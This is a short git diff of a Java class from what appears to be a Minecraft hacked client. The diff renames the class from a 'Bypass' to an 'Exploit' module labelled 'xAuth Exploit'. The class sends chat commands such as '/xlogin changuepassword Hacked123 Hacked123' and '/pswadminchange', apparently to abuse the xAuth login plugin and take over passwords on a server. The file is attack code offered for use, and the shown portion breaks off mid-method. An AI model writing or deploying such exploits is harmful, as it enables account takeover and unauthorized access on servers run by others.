@@ -1,23 +1,23 @@
 package it.md_4.troy.command.bypass.auth;
 
 
-import it.md_4.troy.command.bypass.BypassInfo;
-import it.md_4.troy.command.bypass.BypassType;
-import it.md_4.troy.exception.BypassException;
-import it.md_4.troy.command.bypass.Bypass;
+import it.md_4.troy.exception.ExploitException;
+import it.md_4.troy.exploit.Exploit;
+import it.md_4.troy.exploit.ExploitInfo;
+import it.md_4.troy.exploit.ExploitType;
 import it.md_4.troy.helper.ChatHelper;
 import net.minecraft.client.Minecraft;
 import net.minecraft.network.play.client.C01PacketChatMessage;
 
-@BypassInfo(
+@ExploitInfo(
         name = "xauth",
-        type = BypassType.AUTH,
+        type = ExploitType.OTHER,
         description = "xAuth Exploit"
 )
-public class Auth1 extends Bypass {
+public class Auth1 extends Exploit {
 
     @Override
-    public void execute(Object... args) throws BypassException {
+    public void execute(Object... args) throws ExploitException {
         long start = System.currentTimeMillis();
         Minecraft.getMinecraft().getNetHandler().addToSendQueue(new C01PacketChatMessage("/xlogin changuepassword Hacked123 Hacked123"));
         Minecraft.getMinecraft().getNetHandler().addToSendQueue(new C01PacketChatMessage("/pswadminchange"));
